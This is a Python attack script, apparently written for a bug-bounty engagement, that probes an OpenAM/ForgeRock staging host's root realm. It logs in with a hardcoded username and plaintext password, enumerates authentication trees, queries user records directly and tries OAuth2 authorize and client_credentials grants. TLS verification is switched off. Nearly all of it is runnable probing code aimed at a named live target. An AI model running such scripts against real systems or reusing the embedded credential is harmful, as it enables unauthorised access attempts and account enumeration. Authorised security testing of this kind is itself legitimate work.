# -*- coding: utf-8 -*-
"""AIC 第五十轮:根 realm 全面打开(独立认证树/用户库/OAuth2 面)
上轮发现:/am/json/authenticate(根 realm)200 返回 authId——根 realm 认证树存在,
   与 alpha realm 独立,从未测过。
本轮:
A. 根 realm authenticate:dump callbacks -> 提交 pccp 凭据(是否同用户库)
B. 根 realm 树名枚举(authIndexType=service)
C. 根 realm users 直查(/am/json/users/{MY_ID},无 realms/alpha 段)
D. 根 realm oauth2(无 realm 段 authorize + client 枚举)
预期结果表:
  成立 -> 根 realm 用户库不同/有未加固树/权限策略不同 -> 新攻击面
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
TOKEN_EP = BASE + '/am/oauth2/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

print('=== A. 根 realm authenticate callbacks ===')
r = S.post(BASE + '/am/json/authenticate', json={}, timeout=15, verify=False)
d = r.json()
print('status=%d authId=%s' % (r.status_code, (d.get('authId') or 'NONE')[:40]))
for cb in d.get('callbacks', []):
    print('  type=%s prompt=%s' % (cb.get('type'), [o.get('value') for o in cb.get('output', []) if o.get('name') == 'prompt']))
if d.get('authId'):
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = S.post(BASE + '/am/json/authenticate', json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    j = r2.json()
    print('提交 pccp 凭据 -> %d tokenId=%s callbacks=%d' % (
        r2.status_code, (j.get('tokenId') or 'NONE')[:30], len(j.get('callbacks', []))))
    if j.get('tokenId'):
        print('  !! 根 realm 可用 pccp 登录! successUrl=%s' % j.get('successUrl'))

print('\n=== B. 根 realm 树名枚举 ===')
for tree in ['Login', 'Registration', 'AdminLogin', 'SelfService', 'Authentication',
             'forgotPassword', 'PlatformLogin', 'Users', 'Default']:
    try:
        r = S.post(BASE + '/am/json/authenticate?authIndexType=service&authIndexValue=' + tree,
                   json={}, timeout=12, verify=False)
        d = r.json()
        cbs = [cb.get('type') for cb in d.get('callbacks', [])]
        print('root tree=%-18s -> %d authId=%s callbacks=%s' % (
            tree, r.status_code, bool(d.get('authId')), cbs))
    except Exception as e:
        print('root tree=%-18s -> ERR %s' % (tree, str(e)[:60]))
    time.sleep(0.4)

print('\n=== C. 根 realm users 直查 ===')
for p in ['/am/json/users/' + MY_ID, '/am/json/users/' + MY_ID + '?_fields=*',
          '/am/json/users?userName=pccp', '/am/json/realms/root/users/' + MY_ID]:
    try:
        r = S.get(BASE + p, timeout=12, verify=False)
        print('%-80s -> %d %s' % (p, r.status_code, r.text[:130].replace('\n', ' ')))
    except Exception as e:
        print('%-80s -> ERR %s' % (p, str(e)[:60]))
    time.sleep(0.4)

print('\n=== D. 根 realm oauth2 ===')
for p in ['/am/oauth2/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(RU, safe=''),
          '/am/oauth2/realms/root/authorize?client_id=endUserUIClient&response_type=code&redirect_uri=%s&scope=openid&state=t' % quote(RU, safe='')]:
    try:
        r = S.get(BASE + p, timeout=12, verify=False, allow_redirects=False)
        loc = r.headers.get('Location', '')
        print('%-110s -> %d %s' % (p[:110], r.status_code, loc[:100]))
    except Exception as e:
        print('ERR %s' % str(e)[:60])
    time.sleep(0.4)
for p in ['/am/oauth2/access_token', '/am/oauth2/realms/root/access_token']:
    try:
        r = S.post(BASE + p, data={'grant_type': 'client_credentials', 'client_id': 'endUserUIClient'},
                   headers=FORM, timeout=12, verify=False)
        print('%-50s -> %d %s' % (p, r.status_code, r.text[:120].replace('\n', ' ')))
    except Exception as e:
        print('%-50s -> ERR %s' % (p, str(e)[:60]))
    time.sleep(0.4)
